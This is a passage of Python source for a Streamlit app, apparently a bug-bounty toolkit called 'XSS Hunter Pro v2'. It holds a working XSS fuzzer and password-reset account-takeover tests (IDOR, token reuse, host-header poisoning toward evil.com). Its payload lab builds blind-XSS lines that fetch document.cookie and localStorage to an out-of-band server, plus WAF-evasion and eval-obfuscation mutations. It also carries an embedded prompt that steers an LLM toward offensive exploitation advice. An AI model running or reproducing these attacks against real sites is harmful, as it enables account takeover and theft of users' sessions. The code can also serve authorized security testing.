                    "note": f"{'REFLECTED in response!' if reflected else 'Accepted — check email for poisoned link'}",
                })
        except Exception:
            pass
    return findings


def test_reset_token_reuse(reset_url, token, new_password, session, content_type="json"):
    """Test if reset token can be reused."""
    findings = []
    body = {"token": token, "password": new_password}
    try:
        # First use
        if content_type == "json":
            r1 = session.post(reset_url, json=body, timeout=10, verify=False)
        else:
            r1 = session.post(reset_url, data=body, timeout=10, verify=False)

        # Second use (should fail)
        body["password"] = new_password + "reuse"
        if content_type == "json":
            r2 = session.post(reset_url, json=body, timeout=10, verify=False)
        else:
            r2 = session.post(reset_url, data=body, timeout=10, verify=False)

        if r2.status_code in [200, 201, 204]:
            findings.append({
                "test": "Token Reuse",
                "severity": "HIGH",
                "status_code": r2.status_code,
                "response_snippet": r2.text[:300],
                "payload": f"token={token[:20]}...",
                "note": "Token accepted twice — persistent ATO possible",
            })
    except Exception:
        pass
    return findings


def test_reset_idor(reset_url, attacker_token, target_user_id, new_password, session):
    """Test IDOR on password reset endpoint."""
    findings = []
    payloads = [
        {"user_id": target_user_id, "token": attacker_token, "password": new_password},
        {"id": target_user_id, "token": attacker_token, "password": new_password},
        {"uid": target_user_id, "token": attacker_token, "password": new_password},
        {"userId": target_user_id, "token": attacker_token, "password": new_password},
        {"account_id": target_user_id, "token": attacker_token, "password": new_password},
    ]
    for body in payloads:
        try:
            r = session.post(reset_url, json=body, timeout=10, verify=False)
            if r.status_code in [200, 201, 204]:
                findings.append({
                    "test": f"IDOR ({list(body.keys())[0]})",
                    "severity": "CRITICAL",
                    "status_code": r.status_code,
                    "response_snippet": r.text[:300],
                    "payload": json.dumps(body)[:500],
                    "note": "Password changed for different user — full ATO",
                })
        except Exception:
            pass
    return findings


def test_reset_rate_limit(url, victim_email, session, content_type="json", count=20):
    """Test rate limiting on reset endpoint."""
    findings = []
    success_count = 0
    for i in range(count):
        try:
            body = {"email": victim_email} if content_type == "json" else f"email={victim_email}"
            if content_type == "json":
                r = session.post(url, json=body, timeout=5, verify=False)
            else:
                r = session.post(url, data=body,
                                 headers={"Content-Type": "application/x-www-form-urlencoded"},
                                 timeout=5, verify=False)
            if r.status_code in [200, 201, 202, 204]:
                success_count += 1
            elif r.status_code == 429:
                break
        except Exception:
            break

    if success_count >= count:
        findings.append({
            "test": "Rate Limit Bypass",
            "severity": "MEDIUM",
            "status_code": 200,
            "response_snippet": f"{success_count}/{count} requests succeeded without throttling",
            "payload": f"{count} rapid POST requests",
            "note": "No rate limiting — enables token brute-force and email bombing",
        })
    return findings


def test_reset_email_normalization(url, victim_email, session, content_type="json"):
    """Test email canonicalization bypasses."""
    findings = []
    local, domain = victim_email.split("@")

    variants = [
        ("Plus addressing", f"{local}+test@{domain}"),
        ("Dot manipulation", f"{local[0]}.{local[1:]}@{domain}"),
        ("Case variation", f"{local.upper()}@{domain}"),
        ("Googlemail alias", f"{local}@googlemail.com") if "gmail" in domain else None,
        ("Trailing space", f"{victim_email} "),
        ("Leading space", f" {victim_email}"),
        ("Tab char", f"{victim_email}\t"),
        ("Null byte", f"{victim_email}%00"),
    ]

    for item in variants:
        if not item:
            continue
        name, email_var = item
        try:
            body = {"email": email_var} if content_type == "json" else f"email={quote(email_var)}"
            if content_type == "json":
                r = session.post(url, json=body, timeout=10, verify=False)
            else:
                r = session.post(url, data=body,
                                 headers={"Content-Type": "application/x-www-form-urlencoded"},
                                 timeout=10, verify=False)

            if r.status_code in [200, 201, 202, 204]:
                error_kw = ["not found", "no account", "invalid", "does not exist"]
                if not any(kw in r.text.lower()[:500] for kw in error_kw):
                    findings.append({
                        "test": f"Email Normalization: {name}",
                        "severity": "MEDIUM",
                        "status_code": r.status_code,
                        "response_snippet": r.text[:300],
                        "payload": email_var,
                        "note": "Variant accepted — may bypass account lookups or deliver to different mailbox",
                    })
        except Exception:
            pass
    return findings


# ══════════════════════════════════════════════════════════
# AI ANALYSIS (OpenRouter)
# ══════════════════════════════════════════════════════════

def query_ai(prompt, api_key, model="meta-llama/llama-4-maverick:free"):
    """Query OpenRouter for AI-powered analysis."""
    if not api_key:
        return "Error: No API key provided"

    try:
        r = requests.post(
            "https://openrouter.ai/api/v1/chat/completions",
            headers={
                "Authorization": f"Bearer {api_key}",
                "Content-Type": "application/json",
                "HTTP-Referer": "https://zwanski.bio",
                "X-Title": "XSS Hunter Pro v2",
            },
            json={
                "model": model,
                "messages": [
                    {"role": "system", "content": (
                        "You are an expert offensive security researcher specializing in web application "
                        "vulnerability analysis. You help with XSS exploitation, CORS abuse, password reset "
                        "ATO chains, OAuth attacks, and bug bounty report writing. Be direct, technical, "
                        "and actionable. Include specific payloads, bypass techniques, and exploitation "
                        "steps. Frame everything from an attacker's perspective for authorized testing."
                    )},
                    {"role": "user", "content": prompt},
                ],
                "max_tokens": 2000,
                "temperature": 0.3,
            },
            timeout=30,
        )
        if r.status_code == 200:
            data = r.json()
            return data.get("choices", [{}])[0].get("message", {}).get("content", "No response")
        else:
            return f"API Error {r.status_code}: {r.text[:300]}"
    except Exception as e:
        return f"Connection error: {str(e)}"


def ai_analyze_finding(finding, api_key, model="meta-llama/llama-4-maverick:free"):
    """Use AI to analyze a specific finding and suggest exploitation."""
    prompt = f"""Analyze this XSS finding and provide:
1. Exploitation steps (how to weaponize beyond alert(1))
2. WAF bypass suggestions if applicable
3. Impact escalation (cookie theft, ATO chain, etc.)
4. CVSS score justification
5. Concise HackerOne report paragraph

Finding:
- Type: {finding.get('type', 'XSS')}
- Parameter: {finding.get('param', '?')}
- Context: {finding.get('context', '?')}
- Payload: {finding.get('payload', '?')}
- URL: {finding.get('url', '?')}
- Confidence: {finding.get('confidence', '?')}%
"""
    return query_ai(prompt, api_key, model)


# ══════════════════════════════════════════════════════════
# SIDEBAR
# ══════════════════════════════════════════════════════════

with st.sidebar:
    st.markdown("## ⚡ XSS Hunter Pro v2")
    st.markdown('<span style="font-family:JetBrains Mono,monospace;font-size:0.7rem;color:#4a5873">by zwanski · authorized testing only</span>', unsafe_allow_html=True)
    st.divider()

    page = st.radio("Navigation", [
        "🎯 Scanner",
        "🛡️ Security Audit",
        "🔗 CORS Checker",
        "🔐 Reset ATO",
        "🤖 AI Assist",
        "📋 Findings",
        "🧬 Payload Lab",
        "📊 Report",
        "📖 Cheatsheet",
    ], label_visibility="collapsed")

    st.divider()
    total_findings = len(st.session_state.findings)
    crits = sum(1 for f in st.session_state.findings if f.get("severity") == "CRITICAL")
    highs = sum(1 for f in st.session_state.findings if f.get("severity") == "HIGH")
    cors_f = len(st.session_state.cors_findings)
    dom_f = len(st.session_state.dom_findings)
    reset_f = len(st.session_state.reset_findings)

    st.markdown(f"**🔴** {crits}  **🟠** {highs}  **Total** {total_findings}")
    if cors_f: st.markdown(f"**🔗 CORS:** {cors_f}")
    if dom_f:  st.markdown(f"**💀 DOM:** {dom_f}")
    if reset_f: st.markdown(f"**🔐 Reset:** {reset_f}")

    st.divider()
    import os
    ai_key_env = os.environ.get("OPENROUTER_API_KEY", "")
    ai_api_key = st.text_input("🤖 OpenRouter Key", value=ai_key_env, type="password",
                                help="Get key at openrouter.ai", key="sidebar_ai_key")

    if total_findings and st.button("🗑️ Clear all"):
        for k in DEFAULTS:
            st.session_state[k] = DEFAULTS[k] if not isinstance(DEFAULTS[k], list) else []
        st.rerun()


# ══════════════════════════════════════════════════════════
# PAGE: SCANNER
# ══════════════════════════════════════════════════════════
if page == "🎯 Scanner":
    st.markdown("## ⚡ XSS Scanner")

    col1, col2 = st.columns([2, 1])
    with col1:
        target_url = st.text_input("Target URL", placeholder="https://target.com/search?q=test")
    with col2:
        scan_mode = st.selectbox("Mode", [
            "Quick (URL params)",
            "Standard (URL + Forms)",
            "Deep (URL + Forms + Headers + Crawl)",
            "Stealth (slow + WAF bypass mutations)",
        ])

    col3, col4 = st.columns(2)
    with col3:
        cookies = st.text_input("Cookies", placeholder="session=abc123; token=xyz")
        oob_url = st.text_input("OOB Server", placeholder="https://abc.oast.fun")
    with col4:
        extra_headers = st.text_area("Extra Headers", placeholder="X-Bug-Bounty: zwanski", height=68)
        scope_domains = st.text_input("Scope (domains)", placeholder="target.com, *.target.com",
                                      help="Leave empty to skip scope check")

    col5, col6, col7 = st.columns(3)
    with col5:
        delay = st.slider("Delay (ms)", 0, 2000, 100, 50) / 1000
    with col6:
        threads = st.slider("Threads", 1, 10, 4)
    with col7:
        crawl_depth = st.slider("Crawl links", 0, 50, 10)

    # Payload selection
    st.markdown("**Payload Categories**")
    cols = st.columns(4)
    selected = []
    for i, cat in enumerate(PAYLOADS.keys()):
        with cols[i % 4]:
            default = cat not in ["JSON/Template Breakout", "Polyglots"]
            if st.checkbox(cat, value=default, key=f"cat_{i}"):
                selected.append(cat)

    payloads_flat = list(dict.fromkeys(p for c in selected for p in PAYLOADS[c]))
    st.markdown(f'<span class="mono" style="color:#4a5873">→ {len(payloads_flat)} payloads from {len(selected)} categories</span>', unsafe_allow_html=True)

    run_scan = st.button("⚡ START SCAN", type="primary", disabled=not target_url)

    if run_scan and target_url:
        # Scope check
        allowed = [d.strip() for d in scope_domains.split(",") if d.strip()] if scope_domains else []
        if allowed and not validate_scope(target_url, allowed):
            st.error(f"❌ Target is OUT OF SCOPE. Allowed: {', '.join(allowed)}")
            st.stop()

        st.session_state.findings = []
        st.session_state.dom_findings = []
        st.session_state.scan_start = datetime.utcnow()

        session = make_session(cookies, extra_headers)
        status = st.empty()
        progress = st.empty()
        log_area = st.empty()
        log = []

        def add_log(msg):
            log.append(f"[{datetime.utcnow().strftime('%H:%M:%S')}] {msg}")
            log_area.code("\n".join(log[-25:]), language=None)

        add_log(f"Target: {target_url}")
        add_log(f"Mode: {scan_mode} | Payloads: {len(payloads_flat)} | Threads: {threads}")

        # WAF
        status.info("🔍 WAF detection...")
        waf = detect_waf(target_url, session)
        if waf:
            add_log(f"⚠️ WAF: {waf}")
            st.session_state.waf_detected = True
            st.session_state.waf_type = waf
        else:
            add_log("✅ No WAF detected")

        # Security headers
        status.info("🛡️ Auditing security headers...")
        st.session_state.header_audit = audit_security_headers(target_url, session)
        fails = sum(1 for h in st.session_state.header_audit if h[0] == "FAIL")
        warns = sum(1 for h in st.session_state.header_audit if h[0] == "WARN")
        add_log(f"Headers: {fails} failures, {warns} warnings")

        # DOM XSS analysis
        status.info("💀 DOM XSS source-sink analysis...")
        try:
            page_html = session.get(target_url, timeout=10, verify=False).text
            dom_results = analyze_dom_xss(page_html)
            st.session_state.dom_findings = dom_results
            add_log(f"DOM XSS: {len(dom_results)} potential source-sink pairs")
        except Exception:
            add_log("DOM analysis failed")

        all_findings = []

        # Phase 1: URL params
        status.info("📡 Phase 1: URL parameter fuzzing...")
        progress.progress(0.0)
        f1 = fuzz_url_params(target_url, session, payloads_flat, oob_url, delay, threads,
                             waf if "Stealth" in scan_mode else "",
                             lambda p: progress.progress(min(p * 0.4, 0.4)))
        all_findings.extend(f1)
        add_log(f"URL params: {len(f1)} findings")

        # Phase 2: Forms
        if "Standard" in scan_mode or "Deep" in scan_mode or "Stealth" in scan_mode:
            status.info("📋 Phase 2: Form fuzzing...")
            progress.progress(0.4)
            f2 = fuzz_forms(target_url, session, payloads_flat, oob_url, delay)
            all_findings.extend(f2)
            add_log(f"Forms: {len(f2)} findings")

        # Phase 3: Headers
        if "Deep" in scan_mode or "Stealth" in scan_mode:
            status.info("📨 Phase 3: Header injection...")
            progress.progress(0.6)
            f3 = fuzz_headers(target_url, session, delay)
            all_findings.extend(f3)
            add_log(f"Headers: {len(f3)} findings")

        # Phase 4: Crawl
        if ("Deep" in scan_mode or "Stealth" in scan_mode) and crawl_depth > 0:
            status.info("🕷️ Phase 4: Crawling...")
            progress.progress(0.75)
            links = crawl_links(target_url, session, crawl_depth)
            add_log(f"Crawled: {len(links)} parameterized links")
            for i, link in enumerate(links):
                if allowed and not validate_scope(link, allowed):
                    continue
                lf = fuzz_url_params(link, session, payloads_flat[:15], oob_url, delay, threads, "")
                all_findings.extend(lf)
                progress.progress(0.75 + (i / max(len(links), 1)) * 0.2)

        # Dedup
        seen = set()
        unique = []
        for f in all_findings:
            key = f"{f['param']}::{f['payload'][:40]}::{f.get('context','')}"
            if key not in seen:
                seen.add(key)
                unique.append(f)

        st.session_state.findings = unique
        st.session_state.scan_done = True
        st.session_state.scan_end = datetime.utcnow()
        progress.progress(1.0)

        crit = sum(1 for f in unique if f["severity"] == "CRITICAL")
        high = sum(1 for f in unique if f["severity"] == "HIGH")
        med  = sum(1 for f in unique if f["severity"] == "MEDIUM")
        add_log(f"✅ Done: {len(unique)} unique (CRIT:{crit} HIGH:{high} MED:{med})")

        if unique:
            status.error(f"🚨 {len(unique)} findings — {crit} CRIT, {high} HIGH, {med} MED")
        else:
            status.success("✅ No XSS found")


# ══════════════════════════════════════════════════════════
# PAGE: SECURITY AUDIT
# ══════════════════════════════════════════════════════════
elif page == "🛡️ Security Audit":
    st.markdown("## 🛡️ Security Header Audit")

    audit_url = st.text_input("URL to audit", placeholder="https://target.com")
    if st.button("Run Audit") and audit_url:
        s = make_session()
        st.session_state.header_audit = audit_security_headers(audit_url, s)
        st.session_state.dom_findings = []
        try:
            page_html = s.get(audit_url, timeout=10, verify=False).text
            st.session_state.dom_findings = analyze_dom_xss(page_html)
        except Exception:
            pass

    results = st.session_state.header_audit
    if results:
        for status, name, detail in results:
            cls = {"PASS": "hdr-pass", "FAIL": "hdr-fail", "WARN": "hdr-warn"}.get(status, "hdr-warn")
            icon = {"PASS": "✅", "FAIL": "❌", "WARN": "⚠️"}.get(status, "ℹ️")
            st.markdown(f'<div class="hdr-row {cls}">{icon} <b>{name}</b> — {detail}</div>', unsafe_allow_html=True)

    dom = st.session_state.dom_findings
    if dom:
        st.markdown("### 💀 DOM XSS Analysis")
        for d in dom:
            st.markdown(f'<div class="card high"><b>Source:</b> <code>{d["source"]}</code> → <b>Sink:</b> <code>{d["sink"]}</code> — Confidence: {d["confidence"]}%<br><span class="mono">{html.escape(d["context"][:150])}</span></div>', unsafe_allow_html=True)
    elif results:
        st.info("No DOM XSS source-sink pairs detected")


# ══════════════════════════════════════════════════════════
# PAGE: CORS CHECKER
# ══════════════════════════════════════════════════════════
elif page == "🔗 CORS Checker":
    st.markdown("## 🔗 CORS Misconfiguration Scanner")

    cors_url = st.text_input("URL to test", placeholder="https://api.target.com/endpoint")
    cookies_cors = st.text_input("Cookies (optional)", placeholder="session=abc")

    if st.button("Test CORS") and cors_url:
        s = make_session(cookies_cors)
        st.session_state.cors_findings = check_cors(cors_url, s)

    findings = st.session_state.cors_findings
    if findings:
        for f in findings:
            col = {"CRITICAL": "crit", "HIGH": "high", "MEDIUM": "med"}.get(f["severity"], "info")
            st.markdown(f"""<div class="card {col}">
<span class="badge badge-{col.replace('med','med')}">{f['severity']}</span>
<b>Origin:</b> <code>{f['origin']}</code> → <b>Reflected:</b> <code>{f['reflected']}</code><br>
<b>Credentials:</b> {f['credentials'] or 'none'}<br>
<b>Impact:</b> {f['note']}
</div>""", unsafe_allow_html=True)
    elif cors_url:
        st.success("✅ No CORS misconfigurations found")


# ══════════════════════════════════════════════════════════
# PAGE: RESET ATO
# ══════════════════════════════════════════════════════════
elif page == "🔐 Reset ATO":
    st.markdown("## 🔐 Password Reset Account Takeover")
    st.markdown('<div class="card info"><span class="mono">Tests email manipulation, parameter pollution, host header poisoning, token reuse, IDOR, rate limits, and email normalization on password reset flows.</span></div>', unsafe_allow_html=True)

    col1, col2 = st.columns(2)
    with col1:
        reset_url = st.text_input("Reset endpoint URL", placeholder="https://target.com/api/auth/password-reset")
        victim_email = st.text_input("Victim email", placeholder="victim@target.com")
        attacker_email = st.text_input("Attacker email", placeholder="attacker@evil.com")
    with col2:
        attacker_domain = st.text_input("Attacker domain (for host poison)", placeholder="evil.com", value="evil.com")
        reset_content_type = st.selectbox("Content-Type", ["json", "form"])
        reset_cookies = st.text_input("Cookies (if needed)", placeholder="session=abc", key="reset_cookies")

    st.markdown("**Test Categories**")
    rc1, rc2, rc3, rc4 = st.columns(4)
    with rc1:
        t_email = st.checkbox("Email Manipulation", value=True)
        t_hpp = st.checkbox("Param Pollution", value=True)
    with rc2:
        t_host = st.checkbox("Host Header Poison", value=True)
        t_norm = st.checkbox("Email Normalization", value=True)
    with rc3:
        t_rate = st.checkbox("Rate Limit Test", value=True)
        t_idor = st.checkbox("IDOR Test", value=False)
    with rc4:
        t_reuse = st.checkbox("Token Reuse Test", value=False)
        idor_uid = st.text_input("Target user ID (IDOR)", placeholder="12345", key="idor_uid")
        reuse_token = st.text_input("Reset token (reuse test)", placeholder="abc123", key="reuse_tok")

    if st.button("🔐 RUN TESTS", type="primary", disabled=not (reset_url and victim_email)):
        session = make_session(reset_cookies)
        all_reset = []
        status = st.empty()
        log_area = st.empty()
        log = []

        def rlog(msg):
            log.append(f"[{datetime.utcnow().strftime('%H:%M:%S')}] {msg}")
            log_area.code("\n".join(log[-20:]), language=None)

        rlog(f"Target: {reset_url}")

        if t_email:
            status.info("📧 Testing email manipulation...")
            f = test_reset_email_manipulation(reset_url, victim_email, attacker_email, session, reset_content_type)
            all_reset.extend(f)
            rlog(f"Email manipulation: {len(f)} findings")

        if t_hpp:
            status.info("🔀 Testing parameter pollution...")
            f = test_reset_param_pollution(reset_url, victim_email, attacker_email, session)
            all_reset.extend(f)
            rlog(f"Param pollution: {len(f)} findings")

        if t_host:
            status.info("🏠 Testing host header poisoning...")
            f = test_reset_host_header_poison(reset_url, victim_email, attacker_domain, session, reset_content_type)
            all_reset.extend(f)
            rlog(f"Host poison: {len(f)} findings")

        if t_norm:
            status.info("📝 Testing email normalization...")
            f = test_reset_email_normalization(reset_url, victim_email, session, reset_content_type)
            all_reset.extend(f)
            rlog(f"Email normalization: {len(f)} findings")

        if t_rate:
            status.info("⏱️ Testing rate limiting...")
            f = test_reset_rate_limit(reset_url, victim_email, session, reset_content_type)
            all_reset.extend(f)
            rlog(f"Rate limit: {len(f)} findings")

        if t_idor and idor_uid:
            status.info("🔓 Testing IDOR...")
            f = test_reset_idor(reset_url, reuse_token or "test_token", idor_uid, "Hacked123!", session)
            all_reset.extend(f)
            rlog(f"IDOR: {len(f)} findings")

        if t_reuse and reuse_token:
            status.info("♻️ Testing token reuse...")
            f = test_reset_token_reuse(reset_url, reuse_token, "Reused123!", session, reset_content_type)
            all_reset.extend(f)
            rlog(f"Token reuse: {len(f)} findings")

        st.session_state.reset_findings = all_reset
        crits = sum(1 for f in all_reset if f["severity"] == "CRITICAL")
        highs = sum(1 for f in all_reset if f["severity"] == "HIGH")
        rlog(f"✅ Done: {len(all_reset)} findings (CRIT:{crits} HIGH:{highs})")

        if all_reset:
            status.error(f"🚨 {len(all_reset)} findings — {crits} CRITICAL, {highs} HIGH")
        else:
            status.success("✅ No issues found")

    # Display results
    if st.session_state.reset_findings:
        st.markdown("### Results")
        for f in st.session_state.reset_findings:
            col_map = {"CRITICAL": "crit", "HIGH": "high", "MEDIUM": "med", "INFO": "info"}
            cls = col_map.get(f["severity"], "info")
            with st.expander(f"[{f['severity']}] {f['test']}"):
                st.markdown(f"**Note:** {f['note']}")
                st.markdown(f"**Status:** {f['status_code']}")
                st.markdown("**Payload:**")
                st.code(f["payload"], language=None)
                st.markdown("**Response:**")
                st.code(f["response_snippet"], language=None)


# ══════════════════════════════════════════════════════════
# PAGE: AI ASSIST
# ══════════════════════════════════════════════════════════
elif page == "🤖 AI Assist":
    st.markdown("## 🤖 AI Security Analyst")

    api_key = ai_api_key or ""
    if not api_key:
        st.warning("Enter your OpenRouter API key in the sidebar to use AI features.")

    ai_model = st.selectbox("Model", [
        "meta-llama/llama-4-maverick:free",
        "meta-llama/llama-4-scout:free",
        "deepseek/deepseek-r1:free",
        "google/gemini-2.0-flash-exp:free",
        "qwen/qwen3-235b-a22b:free",
    ])

    tab_chat, tab_analyze, tab_report = st.tabs(["💬 Chat", "🔍 Analyze Finding", "📝 Report Writer"])

    with tab_chat:
        prompt = st.text_area("Ask anything about web security", height=120,
                              placeholder="How do I bypass CSP with unsafe-inline? / Suggest XSS payloads for angular apps / How to chain CORS with XSS for ATO")
        if st.button("🤖 Ask AI", disabled=not api_key) and prompt:
            with st.spinner("Thinking..."):
                response = query_ai(prompt, api_key, ai_model)
            st.markdown("### Response")
            st.markdown(response)
            st.session_state.ai_history.append({"q": prompt, "a": response})

        if st.session_state.ai_history:
            st.markdown("### History")
            for h in reversed(st.session_state.ai_history[-5:]):
                with st.expander(h["q"][:80]):
                    st.markdown(h["a"])

    with tab_analyze:
        st.markdown("Select a finding to get AI exploitation analysis:")
        all_f = st.session_state.findings
        if not all_f:
            st.info("No findings yet — run a scan first.")
        else:
            options = [f"[{f['severity']}] {f['param']} — {f.get('context','')}" for f in all_f]
            selected_idx = st.selectbox("Finding", range(len(options)), format_func=lambda i: options[i])
            if st.button("🔍 Analyze", disabled=not api_key):
                with st.spinner("Analyzing..."):
                    result = ai_analyze_finding(all_f[selected_idx], api_key, ai_model)
                st.markdown(result)

    with tab_report:
        st.markdown("Generate a report paragraph from a description:")
        desc = st.text_area("Describe the vulnerability", height=100,
                            placeholder="Found reflected XSS in the search parameter on /api/search. Payload <img src=x onerror=alert(1)> executes in HTML body context. No CSP. Cookies have no HttpOnly.")
        if st.button("📝 Generate Report", disabled=not api_key) and desc:
            report_prompt = f"""Write a professional HackerOne bug bounty report for this vulnerability. Include:
- Title
- Severity with CVSS vector
- Summary
- Steps to reproduce
- Impact
- Remediation

Vulnerability description: {desc}"""
            with st.spinner("Writing..."):
                result = query_ai(report_prompt, api_key, ai_model)
            st.markdown(result)


# ══════════════════════════════════════════════════════════
# PAGE: FINDINGS
# ══════════════════════════════════════════════════════════
elif page == "📋 Findings":
    st.markdown("## 📋 Findings")
    findings = st.session_state.findings

    if not findings:
        st.info("No findings yet — run a scan first.")
    else:
        crit = [f for f in findings if f["severity"] == "CRITICAL"]
        high = [f for f in findings if f["severity"] == "HIGH"]
        med  = [f for f in findings if f["severity"] == "MEDIUM"]

        c1, c2, c3, c4 = st.columns(4)
        with c1: st.markdown(f'<div class="stat"><div class="stat-val" style="color:var(--accent-red)">{len(crit)}</div><div class="stat-lbl">Critical</div></div>', unsafe_allow_html=True)
        with c2: st.markdown(f'<div class="stat"><div class="stat-val" style="color:var(--accent-orange)">{len(high)}</div><div class="stat-lbl">High</div></div>', unsafe_allow_html=True)
        with c3: st.markdown(f'<div class="stat"><div class="stat-val" style="color:var(--accent-yellow)">{len(med)}</div><div class="stat-lbl">Medium</div></div>', unsafe_allow_html=True)
        with c4: st.markdown(f'<div class="stat"><div class="stat-val">{len(findings)}</div><div class="stat-lbl">Total</div></div>', unsafe_allow_html=True)

        sev_filter = st.multiselect("Filter", ["CRITICAL", "HIGH", "MEDIUM"], default=["CRITICAL", "HIGH", "MEDIUM"])
        filtered = [f for f in findings if f["severity"] in sev_filter]

        for f in filtered:
            sev = f["severity"]
            with st.expander(f"[{sev}] {f['type']} — {f['param']} | {f.get('context','')} | {f['confidence']}%"):
                c1, c2 = st.columns(2)
                with c1:
                    st.markdown(f"**Vector:** {f.get('vector','')}")
                    st.markdown(f"**Parameter:** `{f['param']}`")
                    st.markdown(f"**Context:** {f.get('context','')}")
                    st.markdown(f"**Confidence:** {f['confidence']}%")
                with c2:
                    st.markdown(f"**Status:** {f.get('status_code','')}")
                    st.markdown(f"**Response:** {f.get('response_length','')} bytes")
                    st.markdown(f"**Time:** {f['timestamp']}")
                st.markdown("**Payload:**")
                st.code(f["payload"], language=None)
                st.markdown("**URL:**")
                st.code(f["url"], language=None)


# ══════════════════════════════════════════════════════════
# PAGE: PAYLOAD LAB
# ══════════════════════════════════════════════════════════
elif page == "🧬 Payload Lab":
    st.markdown("## 🧬 Payload Lab")

    tab1, tab2, tab3, tab4 = st.tabs(["🔧 Encoder", "🎯 Blind XSS Builder", "🔀 WAF Bypass Gen", "📚 Library"])

    with tab1:
        raw = st.text_area("Input", '<script>alert(1)</script>', height=70)
        enc = st.selectbox("Encoding", ["HTML Entities", "URL Encode", "Double URL", "Base64 eval",
                                        "Unicode Escape", "Hex Escape", "Char Code eval", "JSFuck (partial)"])
        if st.button("Encode"):
            r = raw
            if enc == "HTML Entities": r = html.escape(raw)
            elif enc == "URL Encode": r = quote(raw, safe="")
            elif enc == "Double URL": r = quote(quote(raw, safe=""), safe="")
            elif enc == "Base64 eval":
                b = base64.b64encode(raw.encode()).decode()
                r = f'eval(atob("{b}"))'
            elif enc == "Unicode Escape": r = "".join(f"\\u{ord(c):04x}" for c in raw)
            elif enc == "Hex Escape": r = "".join(f"\\x{ord(c):02x}" for c in raw)
            elif enc == "Char Code eval":
                codes = ",".join(str(ord(c)) for c in raw)
                r = f"eval(String.fromCharCode({codes}))"
            st.code(r, language=None)

    with tab2:
        oob = st.text_input("OOB server", placeholder="https://abc.oast.fun")
        exfil = st.multiselect("Exfiltrate", ["document.cookie", "document.domain",
                                               "localStorage", "sessionStorage", "location.href"])
        if oob and st.button("Generate"):
            ex = "+'.'+".join(exfil) if exfil else "document.cookie"
            for p in [
                f'<script>fetch("{oob}/?c="+{ex})</script>',
                f'<script>new Image().src="{oob}/?c="+{ex}</script>',
                f'<script src="{oob}/x.js"></script>',
                f'<img src=x onerror="fetch(\'{oob}/?c=\'+{ex})">',
                f'"><script>fetch("{oob}/?c="+{ex})</script>',
                f'<svg onload="fetch(\'{oob}/?c=\'+{ex})">',
            ]:
                st.code(p, language=None)

    with tab3:
        base = st.text_input("Base payload", "<script>alert(1)</script>")
        if st.button("Mutate"):
            for v in mutate_payload(base):
                st.code(v, language=None)
            # Extra smart bypasses
            extras = [
                base.replace("alert(1)", "alert`1`"),
                base.replace("alert(1)", "(alert)(1)"),
                base.replace("alert(1)", "window['alert'](1)"),
                base.replace("alert(1)", "self['alert'](1)"),
                base.replace("alert(1)", "top['al'+'ert'](1)"),
                base.replace("<script>", "<script\x0d\x0a>"),
                base.replace("alert(1)", "eval(String.fromCharCode(97,108,101,114,116,40,49,41))"),
            ]
            for e in extras:
                st.code(e, language=None)

    with tab4:
        search = st.text_input("Search", placeholder="svg, bypass, blind...")
        for cat, plist in PAYLOADS.items():
            filtered = [p for p in plist if not search or search.lower() in p.lower() or search.lower() in cat.lower()]
            if filtered:
                with st.expander(f"{cat} ({len(filtered)})"):
                    for p in filtered:
                        st.code(p, language=None)


# ══════════════════════════════════════════════════════════
# PAGE: REPORT
# ══════════════════════════════════════════════════════════
elif page == "📊 Report":
    st.markdown("## 📊 Report Generator")
    findings = st.session_state.findings
    if not findings:
        st.info("No findings — run a scan first.")
    else:
        target = st.text_input("Target", "target.com")
        program = st.text_input("Program", "HackerOne")
        hunter = st.text_input("Researcher", "Mohamed Ibrahim (zwanski)")
        tpl = st.selectbox("Template", ["HackerOne", "Bugcrowd", "Bug Bounty Switzerland", "Generic Markdown"])

        if st.button("Generate"):
            now = datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC")
            crit = [f for f in findings if f["severity"] == "CRITICAL"]
            high = [f for f in findings if f["severity"] == "HIGH"]
            med  = [f for f in findings if f["severity"] == "MEDIUM"]

            report = f"# XSS Report — {target}\n"
            report += f"**Program:** {program} | **By:** {hunter} | **Date:** {now}\n\n"
            report += f"## Summary\n{len(findings)} XSS findings: {len(crit)} Critical, {len(high)} High, {len(med)} Medium\n\n"

            for i, f in enumerate(findings, 1):
                sev = f["severity"]
                if tpl == "HackerOne":
                    report += f"---\n## Finding {i}: {f['type']} ({sev})\n\n"
                    report += f"**Weakness:** CWE-79 (Cross-Site Scripting)\n"
                    report += f"**Asset:** {target}\n"
                    report += f"**Parameter:** `{f['param']}`\n"
                    report += f"**Context:** {f.get('context','')}\n\n"
                    report += f"### Steps to Reproduce\n"
                    report += f"1. Navigate to the following URL:\n```\n{f['url']}\n```\n"
                    report += f"2. Observe JavaScript execution in the browser\n\n"
                    report += f"### Payload\n```\n{f['payload']}\n```\n\n"
                    report += f"### Impact\nAn attacker can execute arbitrary JavaScript in the victim's browser, "
                    report += f"enabling session hijacking via `document.cookie` theft, credential phishing, "
                    report += f"and DOM manipulation.\n\n"
                else:
                    report += f"---\n## [{sev}] {f['type']} — {f['param']}\n"
                    report += f"**URL:** `{f['url']}`\n"
                    report += f"**Payload:** `{f['payload']}`\n"
                    report += f"**Context:** {f.get('context','')} | **Confidence:** {f['confidence']}%\n\n"

            st.text_area("Report", report, height=400)
            b64 = base64.b64encode(report.encode()).decode()
            st.markdown(f'<a href="data:text/markdown;base64,{b64}" download="xss_report_{target}.md">📥 Download</a>', unsafe_allow_html=True)

        if st.button("Export JSON"):
            j = json.dumps(findings, indent=2)
            b64 = base64.b64encode(j.encode()).decode()
            st.markdown(f'<a href="data:application/json;base64,{b64}" download="findings.json">📥 JSON</a>', unsafe_allow_html=True)


# ══════════════════════════════════════════════════════════
# PAGE: CHEATSHEET
# ══════════════════════════════════════════════════════════
elif page == "📖 Cheatsheet":
    st.markdown("## 📖 XSS Cheatsheet")

    tab1, tab2, tab3 = st.tabs(["Context Guide", "WAF Evasion", "Report Tips"])

    with tab1:
        st.markdown("""
### Reflection Context → Payload

| Where it lands | Context | Go-to payload |
|---|---|---|
| `<div>HERE</div>` | HTML body | `<img src=x onerror=alert(1)>` |
| `<input value="HERE">` | Quoted attr | `" onfocus="alert(1)" autofocus x="` |
| `<a href="HERE">` | URL attr | `javascript:alert(1)` |
| `<script>var x='HERE'</script>` | JS string | `'-alert(1)-'` |
| `<script>var x=HERE</script>` | JS expr | `alert(1)` |
| `<!-- HERE -->` | Comment | `--><script>alert(1)</script>` |
| `<style>HERE</style>` | CSS | `</style><script>alert(1)</script>` |

### DOM XSS Sources → Sinks

| Source | Sink | Impact |
|---|---|---|
